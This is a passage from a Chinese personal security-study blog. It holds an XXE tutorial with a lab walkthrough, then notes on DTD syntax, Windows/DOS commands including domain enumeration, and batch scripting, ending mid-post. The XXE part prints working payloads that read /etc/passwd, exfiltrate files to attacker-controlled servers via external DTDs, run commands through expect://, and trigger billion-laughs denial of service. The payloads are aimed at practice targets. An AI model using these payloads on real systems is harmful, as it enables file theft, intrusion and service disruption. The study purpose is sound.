XML外部实体注入（XXE）：当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等 引入外部实体方式有多种，比如： 恶意引入外部实体方式1： XML内容： 12345&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; 恶意引入外部实体方式2： XML内容： 123456&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % d SYSTEM "htpp://mark4z5.com/evil.dtd"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; DTD文件（evil.dtd）内容： 1&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; 恶意引入外部实体方式3： XML内容： 123&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a SYSTEM "http://mark4z5.com/evil.dtd"&gt;&lt;c&gt;&amp;b;&lt;/c&gt; DTD文件（evil.dtd）内容： 1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 注：不同程序支持的协议不一样： libxml2 PHP java .NET file file http file http http https http ftp ftp ftp https php file ftp compress.zlib jar compress.bzip2 netdoc data mailto glob gopher * phar 以上是默认支持的协议，还可以支持其他的，如PHP支持的拓展协议有： Scheme Extension Required https/ftps openssl zip zip ssh2.shell/ssh2.exec/ssh2.tunnel/ssh2.sftp/ssh2.scp ssh2 rar rar ogg oggvorbis expect expect XXE危害1：读取任意文件： 123456789101112root@kali:# cat testXML.php&lt;?$xml=&lt;&lt;&lt;EOF&lt;?xml version="1.0"?&gt;&lt;! DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;EOF;$date = simplexml_load_string($xml);print_r($data);?&gt; 直接访问此文件的话就能读取/etc/passwd里的文件，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取账号密码后进一步攻击，如读取tomcat-users.xml得到账号密码后登陆tomcat的manager部署webshell 如果数据不回显呢，例如： 123456789101112root@kali:# cat testXML.php&lt;?$xml=&lt;&lt;&lt;EOF&lt;?xml version="1.0"?&gt;&lt;! DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;EOF;$date = simplexml_load_string($xml);#print_r($data);?&gt; 可以把数据发送到远程服务器： 1234567891011121314root@kali:# cat testXML6.php&lt;?php$xml=&lt;&lt;EOF&lt;? xml version="1.0"?&gt;&lt;! DOCTYPE ANY [ &lt;! ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/issue"&gt; &lt;! ENTITY % dtd SYSTEM "http://192.168.1.122/evil.dtd"&gt;%dtd;%send;]&gt;EOF;$data = simplexml_load_string($xml);#print_r($data);?&gt; 远程evil.dtd文件内容如下： 1234&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://192.168.1.122/?file;&apos;&gt;&quot;&gt;%all; 访问testXML6.php触发XXE攻击后，服务器会把文件内容发到攻击者网站（可以通过wireshark抓包查看，也可以直接在攻击者网站查看） XXE危害2：执行系统命令： 123456789101112root@kali:# cat testXML4.php&lt;?php$xml=&lt;&lt;&lt;EOF&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM "expect://id"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 这个例子是在安装expect拓展的PHP环境里执行系统命令，其他协议也有可能执行系统命令 XXE危害3：探测内网端口： 1234567891011root@kali:# cat testXML2.php&lt;?php$xml=&lt;&lt;&lt;EOF&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM "http://192.168.1.1:80/mark4z5"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;EOF;$data = simple?&gt; 访问如果返回Connection refused，则表示此端口关闭；如果返回HTTP request failed，则表示此端口开放 XXE危害4：攻击内网网站： 123456789101112root@kali:# cat testXML3.php&lt;?php$xml=&lt;&lt;&lt;EOF&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY xxs SYSTEM "构造的POC"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 可执行远程系统命令 XXE漏洞练习：Acunetix_demo: 访问站点，点击login下面的“forgot Password”，抓包得到： 12345678910111213POST /forgotpw HTTP/1.1Host: testhtml5.vulnweb.comAccept: text/plain, */*; q=0.01Origin: http://testhtml5.vulnweb.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36Content-Type: text/xmlReferer: http://testhtml5.vulnweb.com/Accept-Language: zh-CN,zh;q=0.8Content-Length: 43Connection: close&lt;forgot&gt;&lt;username&gt;admin&lt;/username&gt;&lt;/forgot&gt; go: 12345678HTTP/1.1 200 OKServer: nginx/1.4.1Date: Thu, 07 Dec 2017 03:21:18 GMTContent-Type: text/html; charset=utf-8Content-Length: 5Connection: closeadmin 观察响应可以发现，程序在解析XML内容，修改请求来验证： 1234567891011121314151617POST /forgotpw HTTP/1.1Host: testhtml5.vulnweb.comAccept: text/plain, */*; q=0.01Origin: http://testhtml5.vulnweb.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36Content-Type: text/xmlReferer: http://testhtml5.vulnweb.com/Accept-Language: zh-CN,zh;q=0.8Content-Length: 43Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE Anything [&lt;!ENTITY myentity &quot;test&quot;&gt;]&gt;&lt;forgot&gt;&lt;username&gt;&amp;myentity;&lt;/username&gt;&lt;/forgot&gt; 响应： 12345678HTTP/1.1 200 OKServer: nginx/1.4.1Date: Thu, 07 Dec 2017 03:23:56 GMTContent-Type: text/html; charset=utf-8Content-Length: 4Connection: closetest 解析了我们构造的XML实体，因此存在XXE漏洞 攻击： 任意文件读取： 12345678910111213141516POST /forgotpw HTTP/1.1Host: testhtml5.vulnweb.comAccept: text/plain, */*; q=0.01Origin: http://testhtml5.vulnweb.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36Content-Type: text/xmlReferer: http://testhtml5.vulnweb.com/Accept-Language: zh-CN,zh;q=0.8Content-Length: 43Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY myentity SYSTEM &quot;file:///location/anyfile&quot; &gt;]&gt;&lt;abc&gt;&amp;myentity;&lt;/abc&gt; DDOS： 12345678910111213141516171819202122232425POST /forgotpw HTTP/1.1Host: testhtml5.vulnweb.comAccept: text/plain, */*; q=0.01Origin: http://testhtml5.vulnweb.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36Content-Type: text/xmlReferer: http://testhtml5.vulnweb.com/Accept-Language: zh-CN,zh;q=0.8Content-Length: 43Connection: close&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; play_XXE.iso: 下载虚拟机镜像，用VM打开后查看ip，攻击机访问即可 任务：读取任意文件，获取secret_url，login as admin 读取任意文件： 先在自己服务器上写入1.dtd： 1234&lt;!ENTITY % x1 SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!--如果报错或者读取不到，可以试试base64编码，因为dtd文件里不能出现尖括号那些符号，php://filter/convert.base64-encode/resource=/etc/passwd--&gt;&lt;!ENTITY % x2 &quot;&lt;!ENTITY y1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%x1;&apos;&gt;&quot;&gt;%x2; 然后构造攻击poc： 123&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://120.79.2.221:8000/1.dtd&quot;&gt;&lt;foo&gt;&amp;y1;&lt;/foo&gt; 接着就能在服务器的日志文件里读取到etc/passwd了 在读取到的passwd内容里有路径：/opt/play-2.1.3/xxe/，稍微改变下1.dtd的内容，就能读取到secret_url了 最后一个login as admin没搞懂。WP也没看懂，先挖个坑 总结：花了几天时间去学习XXE，基本了解了原理及利用方式，路还很长]]></content>
      <tags>
        <tag>Owasp top 10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DTD学习笔记]]></title>
    <url>%2F2017%2F12%2F07%2FDTD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[学习XXE之前，先学习一波DTD才行，不然好多都看不懂，天也不早了，开搞 DTD简介：文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行的声明于XML文档中，也可作为一个外部引用 内部的DOCTYPE声明： 假如DTD被包含在XML源文件中，它应当通过以下语法包装在一个DOCTYPE声明中： 1&lt;!DOCTYPE 根元素 [元素声明]&gt; 带有DTD的XML文档实例： 1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE NOTE[ &lt;!--定义此文档是note类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素：&quot;to,from,heading,body&quot;--&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为&quot;#PCDATA&quot;类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Do not forget the meeting!&lt;/body&gt;&lt;/note&gt; 用浏览器打开的内容是： 12345678 &lt;?xml version="1.0" ?&gt; &lt;!DOCTYPE NOTE (View Source for full doctype...)&gt; - &lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Do not forget the meeting!&lt;/body&gt; &lt;/note&gt; 右键查看源码的话就是以上的XML文档内容 外部文档声明： 假如DTD文档位于XML源文件的外部，那么应通过下面的语法将其封装在一个DOCTYPE定义中： 1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 这个XML文档和上面的XML文档一样的，但是包含了一个外部的DTD： 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Do not forget the meeting!&lt;/body&gt;&lt;/note&gt; 这是XML文档里包含的DTD文件： 12345&lt;!ELEMENT note (to,from.heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; 在浏览器打开效果是一样的，但是如果没有这个note.dtd的话，会有如下报错信息： 123系统未找到指定的资源。处理资源 &apos;note.dtd&apos; 时出错。处理资源 &apos;file:///C:/Users/Administrator/Desktop/1.xml&apos; 时出错。第 2 行，位置: 34 &lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt; DTD构建模块：XML文档构建模块： 所有的XML文档（以及HTML文档）均由下列简单的构建模块构成： 元素 属性 实体 PCDATA CDATA 元素： 元素是XML以及HTML文档的主要构建模块 HTML元素的例子是body和table等，XML元素的例子是note和message。元素可包含文本，其他元素或空。空的HTML元素例如hr、br、img 例子： 12&lt;body&gt;body text in between&lt;/body&gt;&lt;message&gt;some message in bettween&lt;/message&gt; 属性： 属性可额外提供有关元素的信息 属性总是被置于某元素的开始标签中，属性总是以名称-值的形式出现，下面的img元素拥有关于源文件的额外信息： 1&lt;img src="test.jpg" /&gt; 元素的名称是img，属性的名称是src，属性的值是test.jpg，由于元素本身为空，它被一个“/”闭合 实体： 实体是用来定义普通文本的变量，实体引用是对实体的引用 大多数人都了解这个HTML实体引用：”&amp;nbsp.;“（去掉小数点），这个无拆行空格实体在HTML中被用于在某个文档中插入一个额外的空格，当文档被XML解析时，实体就会被展开 以下实体在XML中被预定义： 实体引用 字符 &amp;lt.;（去掉小数点，下同） &lt; &amp;gt.; &gt; &amp;amp.; &amp; &amp;quot.; “ &amp;apos.; ‘ PCDATA： PCDATA的意思是被解析的字符数据，可把字符数据想向为XML元素的开始标签与结束标签之间的文本 PCDATA是会被解析器解析的文本，这些文本将被解析器检查实体以及标记 文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何&amp;、&lt;或&gt;等字符，应用&amp;amp;、&amp;lt;、以及&amp;gt;实体来分别替换他们 CDATA: CDATA的意思是字符数据，是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会展开。 DTD-元素：在一个DTD中，元素通过元素声明来声明 声明一个元素： 元素声明使用下面的语法： 1&lt;!ELEMENT 元素名称 类别&gt; or 1&lt;!ELEMENT 元素名称 （元素内容）&gt; 空元素： 空元素通过类别关键词EMPTY进行声明： 1&lt;!ELEMENT 元素名称 EMPTY&gt; 只有PCDATA的元素： 只有PCDATA的元素通过圆括号中的#PCDATA进行声明： 1&lt;!ELEMENT 元素名称 (#PCDATA)&gt; 带有任何内容的元素： 通过类别关键字ANY声明的元素，可包含任何可解析数据的组合： 1&lt;!ELEMENT 元素名称 ANY&gt; 带有子元素（序列）的元素： 带有一个或多个子元素的元素通过圆括号中的子元素名进行声明： 1&lt;!ELEMENT 元素名称 (子元素名称 1，子元素名称 2，.....)&gt; 例子： 1&lt;!ELEMENT note (to,from,heading,body)&gt; 当元素按照由逗号分隔开的序列进行声明时，这些子元素必须按照相同的顺序出现在文档中。在同一个声明中，子元素也必须被声明，同时子元素也可拥有子元素。”note“元素的完整声明是： 12345&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; 声明只出现一次的元素： 1&lt;!ELEMENT 元素名称 (子元素名称)&gt; 声明的子元素必须出现一次，并且必须只在元素名称元素中出现一次 声明最少出现一次的元素： 1&lt;!ELEMENT 元素名称 (子元素名称+)&gt; 声明的子元素必须在元素名称元素中出现至少一次 声明出现零次或多次的元素： 1&lt;!ELEMENT 元素名称 (子元素名称*)&gt; 声明出现零次或一次的元素： 1&lt;!ELEMENT 元素名称 (子元素名称?)&gt; 声明”非…/即…“类型的内容： 1&lt;!ELEMENT note (to,from,header,(message|body))&gt; 声明混合型的内容： 1&lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt; DTD-属性：在DTD中，属性通过ATTLIST声明进行声明 声明属性： 1&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt; DTD实例： 1&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt; XML实例： 1&lt;payment type=&quot;check&quot; /&gt; 下列是属性类型的选项： 类型 描述 CDATA 值为字符数据 (en1\ en2\ …) 此值是枚举列表中的一个值 ID 值为唯一的id IDREF 值为另外一个元素的ID IDREFS 值为其他id的列表 NMTOKEN 值为合法的XML名称 NMTOKENS 值为合法的XML名称的列表 ENTITY 值是一个实体 ENTITYS 值是一个实体列表 NOTATION 值是符号的名称 xml: 值是一个预定义的XML值 默认值参数可使用下列值： 值 解释 值 属性的默认值 #REQUIRED 属性值是必须的 #IMPLIED 属性不是必须的 #FIXED value 属性值是固定的 规定一个默认的属性值： DTD: 12&lt;!ELEMENT square EMPTY&gt;&lt;!ATTLIST square width CDATA &quot;0&quot;&gt; 合法的XML： 1&lt;square width=&quot;100&quot; /&gt; square被定义为带有CDATA类型的”width“属性的空元素，如果宽度没有被设定，其默认值为0 #IMPLIED： 1&lt;!ATTLIST 元素名称 属性名称 属性类型 #IMPLIED&gt; 例子： DTD: 1&lt;!ATTLIST contact fax CDATA #IMPLIED&gt; 合法的XML： 1&lt;contact fax=&quot;55-667788&quot; /&gt; 合法的XML： 1&lt;contact /&gt; 如果不希望强制包含属性，并且没有默认值选项的话，就可以使用#IMPLIED #REQUIRED: 1&lt;!ATTLIST 元素名称 属性名称 属性类型 #REQUIRED&gt; 例子： DTD: 1&lt;!ATTLIST person number CDATA #REQUIRD&gt; 合法的XML： 1&lt;person number=&quot;456&quot;&gt; 非法的XML： 1&lt;person /&gt; 如果没有默认值选项，又系统强制提交属性的话，可以使用#REQUIRED #FIXED: 1&lt;!ATTLIST 元素名称 属性名称 属性类型 #FIXED &quot;value&quot;&gt; 例子： DTD： 1&lt;!ATTLIST sender company CDATA #FIXED &quot;microsoft&quot;&gt; 合法的XML： 1&lt;sender company=&quot;microsoft&quot; /&gt; 非法的XML： 1&lt;sender company=&quot;CUIT&quot;&gt; 如果希望属性拥有固定的值，而不允许被修改，就可以使用#FIXED 列举属性值： 1&lt;!ATTLIST 元素名称 属性名称 (en1|en2|...) 默认值&gt; 例子： DTD： 1&lt;!ATTLIST payment type (check|cash) &quot;cash&quot;&gt; XML: 1&lt;!payment type="check" /&gt; or 1&lt;!payment type="cash" /&gt; 如果希望属性值为一系列固定的合法值之一，可以使用列举属性值 DTD-实体：实体是用于等译引用普通文本或特使字符的快捷方式的变量实体引用是对实体的引用实体可在内部或外部进行声明 一个内部实体声明： 1&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt; 例子： DTD： 12&lt;!ENTITY writer &quot;test&quot;&gt;&lt;!ENTITY copyright &quot;test&quot;&gt; XML: 1&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; 一个实体由三部分构成：一个&amp;，一个实体名称，一个分号 一个外部实体声明： 1&lt;!ENTITY 实体名称 SYSTEM &quot;URL/URL&quot;&gt; 例子： DTD: 12&lt;!ENTITY writer SYSTEM &quot;url.dtd&quot;&gt;&lt;!ENTITY copyright SYSTEM &quot;url.dtd&quot;&gt; XML: 1&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; DTD实例: 电视节目表DTD： 123456789101112131415161718&lt;!DOCTYPE TVSCHEDULE [ &lt;!ELEMENT TVSCHEDULE (CHANNEL+)&gt; &lt;!ELEMENT CHANNEL (BANNER,DAY+)&gt; &lt;!ELEMENT BANNER (#PCDATA)&gt; &lt;!ELEMENT DAY (DATE,(HOLIDAY|PROGRAMSLOT+)+)&gt; &lt;!ELEMENT HOLIDAY (#PCDATA)&gt; &lt;!ELEMENT DATE (#PCDATA)&gt; &lt;!ELEMENT PROGRAMSLOT (TIME,TITLE,DESCRITION?)&gt; &lt;!ELEMENT TIME (#PCDATA)&gt; &lt;!ELEMENT TITLE (#PCDATA)&gt; &lt;!ELEMENT DESCRIPTION (#PCDATA)&gt; &lt;!ATTLIST TVSCHEDULE NAME CDATA #REQUIRED&gt; &lt;!ATTLIST CHANNEL CHAN CDATA #REQUIRED&gt; &lt;!ATTLIST PROGRAMSLOT VTR CDATA #IMPLIED&gt; &lt;!ATTLIST TITLE RATING CDATA #IMPLIED&gt; &lt;!ATTLIST TITLE LANGUAGE CDATA #IMPLIED&gt;]&gt; 报纸文章DTD： 123456789101112131415161718&lt;!DOCTYPE NEWSPAPER [ &lt;!ELEMENT NEWPAPER (ARTICLE+)&gt; &lt;!ELEMENT ARTICLE (HEADLINE,BYLINE,LEAD,BODY,NOTES)&gt; &lt;!ELEMENT HEADLINE (#PCDATA)&gt; &lt;!ELEMENT BYLINE (#PCDATA)&gt; &lt;!ELEMENT LEAD (#PCDATA)&gt; &lt;!ELEMENT BODY (#PCDATA)&gt; &lt;!ELEMENT BOTES (#PCDATA)&gt; &lt;!ATTLIST ARTICLE AUTHOR CDATA #REQUIRED&gt; &lt;!ATTLIST ARTICLE EDITOR CDATA #IMPLIED&gt; &lt;!ATTLIST ARTICLE DATE CDATA #IMPLIED&gt; &lt;!ATTLIST ARTICLE EDITION CDATA #IMPLIED&gt; &lt;!ENTITY NEWSPAPER &quot;TEST1&quot;&gt; &lt;!ENTITY PUBLISHER &quot;TEST2&quot;&gt; &lt;!ENTITY COPYRIGHT &quot;TEST3&quot;&gt;]&gt; 产品目录DTD： 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE CATALOG [ &lt;!ENTITY AUTOR &quot;TEST1&quot;&gt; &lt;!ENTITY COMPANY &quot;TEST2&quot;&gt; &lt;!RNTITY EMAIL &quot;TEST3&quot;&gt; &lt;!ELEMENT CATALOG (PRIDUCT+)&gt; &lt;!ELEMENT PRODUCT (SPECIFICATIONS+,OPTIONS?,PRICE+,NOTES?)&gt; &lt;!ATTLIST PRODUCT NAME CDATA #IMPLIED CATEGORY (HandTool|Table|Shop-Professional) &quot;HandTool&quot; PARTNUM CDATA #IMPLIED PLANT (Pittsburgh|Milwaukee|Chicago) &quot;Chicago&quot; INVENTRY (InStock|Backordered|Discontinued) &quot;InStock&quot;&gt; &lt;!ELEMENT SPECIFICATIONS (#PCDATA)&gt; &lt;!ATTLIST SPECIFICATIONS WEIGHT CDATA #IMPLIED POWER CDATA #IMPLIED&gt; &lt;!ELEMENT OPTIONS (#PCDATA)&gt; &lt;!ATLIST OPTIONS FINISH (Metal|Poloshed|Matte) &quot;Matte&quot; ADAPTER (Included|Optional|NotApplicable) &quot;Included&quot; CASE (HardShell|Soft|NotApplicable) &quot;HardShell&quot;&gt; &lt;!ELEMENT PRICE (#PCDATA)&gt; &lt;!ATTLIST PRICE MSRP CDATA #IMPLIED WHOLESALE CDATA #IMPLIED STREET CDATA #IMPLIED SHIPPING CDATA #IMPLIED&gt; &lt;!ELEMENT NOTES (#PCDATA)&gt;]&gt;]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用DOS命令]]></title>
    <url>%2F2017%2F11%2F17%2F%E5%B8%B8%E7%94%A8DOS%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[目前对linux命令还算熟悉，就是DOS命令不怎么会，学习一波 系统命令和文件命令：DIR:无参数：查看当前所在目录的文件和文件夹 cd 目录名：进入目录 cd\：返回根目录 cd ..：返回上级目录 md 目录名：建立特定的文件夹 rd 目录名：删除特定的文件夹 del 文件名：删除一个文件 deltree ：删除文件夹和它下面的所有子文件夹和文件 format x：x表示盘符，格式化一个分区 type 文本文件名：显示出文本文件的内容 edit：是个小程序，编辑文本文件用的 ren 旧文件名 新文件名：改名 copy 路径下文件 目标路径：拷贝文件 xcopy：复制目录 chkdsk C：检查C盘的使用情况，如果不带盘符，就检查当前磁盘的使用情况 taskkill：杀死进程命令 tasklist：列出进程 cacls：显示或修改文件的访问控制列表（acl） move：剪切 网络命令：ping： -t：ping指定的主机，直到停止。若要查看统计信息并继续操作，请键入control-break。若要停止请键入control-c -a：将地址解析成主机名 -n count：要发送的回显请求数 -l size：发送缓冲区大小 -f：在数据包中设置“不分段”标志（仅IPv4） -i TTL：生存时间 -v TOS：服务类型（IPv4） -r count：记录计数跃点的路由（IPv4） -s count：计数跃点的时间戳（IPv4） -j host-list：与主机列表一起的松散源路由（IPv4） -k host-list：与主机列表一起的严格路由（IPv4） -w timeout：等待每次恢复的超时时间（毫秒） -R：同样使用路由标头测试反向路由（IPv6） -s scraddr：要使用的源地址 -4：强制使用IPv4 -6：强制使用IPv6 net命令： netstat 主机：查看主机当前的TCP:IP连接状态，如端口 netstat -a：显示所有链接和侦听端口 netsat -ano：显示所有连接并以数字形式显示PID netstat -r：显示路由表等价于route print netstat -b：拥有足够的权限可以查看每个连接及侦听端口所涉及的可执行程序 netstat -p TCP：查看连接中使用的协议 nebtstat 主机：查看主机使用的netBIOS name nbtstat -a cleanxp：列出指定名称的远程机器的名称表 nbtstat -A IP：列出指定IP地址的远程机器名称表 nbtstat -n：列出本地netBIOS名称 nbtstat -R：清楚netBIOS名称缓存并重新装载本地Lmhosts(C:\Windows\System32\drivers\etc\ lmhosts.sam)文件中带标记 #PRE 的项目 tracert 主机：查看从你自己到目标主机到底经过了哪些路径 pathping 主机：类似tracert，但是可以显示一些其不能显示的信息 ipconfig： ipconfig /all：显示详细信息 ipconfig /release：释放当前ip ipconfig /flushdns：刷新dns缓存 ipconfig /registerdns：重新在dns服务器上注册自己 ipconfig /renew：重新获得ip ipconfig /renew EL*：更新所有名称以EL开头的连接 ipconfig /allcompartments：显示有关所有分段的信息 ipconfig /allcompartments /all：显示有关所有分段的相信信息 whoami：查看当前用户的用户名和组信息 systeminfo：查看操纵系统配置信息及补丁 sc：用于与服务控制管理器和服务进行通信的命令行程序 route：操作网络路由表 telnet：ftp：mstsc：远程桌面 ###其他命令： time：显示和设置dos的系统时间 输入新时间：按回车可以跳过 date：显示日期，和time一样 ver：显示正在运行的DOS系统版本号 attrib：设置文件属性 ctty：改变控制设备 defrag：磁盘碎片管理 doskey：调用和建立DOS宏命令 fc：文件比较 prompt：设置提示符 set：设置环境变量 常用网络DOS命令：AT命令：1.定时关机：at 21:00 shutdown -s -t 30 2.定时提醒：at 12:00 net send IP 3.自动运行批处理文件：at 8:00AM /every:saturday test.bat 4.取消计划：at 编号 /delete 域命令：1.查询域管理员用户：net group “domain admins” /domain 2.查询域用户：net user /domain 3.查询域名称：net view /domain 4.查询域内计算机：net view /domain:XX 5.查询域控制器：net time /domain 6.查询所有域控制器：dsquery server 例如： 1dsquery server -domain super.com | dsget server -dnsname -site 搜索域内所有域控制器并显示他们的DNS主机名和站点名称 7.查询域内计算机：dsquery computer 例如： 1dsquery computer domainroot -name admin* -limit 10 搜索域内名称以admin开头的十台机器 查询域用户：dsquery user 例如： 1dsquery user domainroot -name admin* -limit 10 搜索域内以admin开头的十个用户 查询域内子网：dsquery subnet 查询域内用户组：dsquery group 查询域内组织单位：dsquery ou 查询域内站点：dsquery site 路还很长]]></content>
      <tags>
        <tag>windows</tag>
        <tag>学习体会</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BAT脚本入门]]></title>
    <url>%2F2017%2F11%2F16%2FBAT%E8%84%9A%E6%9C%AC%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[定义：bat文件又称批处理文件，它是将一系列命令按一定的顺序以ascii文本写入一个可执行的文本文件，其拓展名为bat（MS-DOS批处理）或者cmd（Windows NT命令脚本），这些命令统称为批处理命令 执行过程：系统会调用command.com或cmd.exe由前向后一次来自动执行这些命令 例子： 123@echo offecho &quot;Hello World!&quot;pause 就会执行输出Hello World的命名，并且卡住一下，因为有pause 另一个例子： 12345@echo offcolor 1cdate /t&amp;time/techo %username%echo %0 会分别执行以下命令： 1234背景色字体颜色变为1c输出当前时间输出当前用户输出文件路径 BAT、EXE、COM文件比较：共同点： 这三种格式都是windows下可执行文件 不同点： 后缀为.exe的文件称为可执行文件，一半大于64kb，执行效率低，但是功能丰富后缀为.com的文件称为命令文件，最大不超过64kb，执行效率高，功能单一后缀为.bat的文件称为批处理文件，是将若干个后缀为.com或.exe等文件组合在一起，使其依次执行，不必一一输入命令和参数 优先级： .com&gt;.exe&gt;.bat BAT内部命令： 关键字 说明 @和echo @字符放在命令前将关闭该命令回显，echo是否为打开状态 ::和rem 注释符。该命令后的内容不被执行，但能回显。 shift 更改批处理文件中可替换参数的位置 set 设置环境变量或者给变量赋值 pushd和popd 切换当前目录 title 设置窗口标题 color 